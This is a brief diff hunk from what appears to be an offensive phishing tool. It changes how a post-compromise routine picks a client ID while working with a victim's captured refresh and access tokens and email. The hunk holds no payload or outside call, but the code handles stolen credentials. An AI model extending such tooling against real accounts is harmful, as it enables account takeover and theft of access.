@@ -299,7 +299,7 @@ def _run_post_compromise_chain(user_code):
 
     rt        = session['refresh_token']
     at        = session['access_token']
-    client_id = session.get('client_id', '29d9ed98-a469-4536-ade2-f981bc1d605e')
+    client_id = session.get('client_id') or Config.CLIENT_ID
     email     = session['victim_email'] or user_code
 
     # Extract tenantId from the captured access token JWT
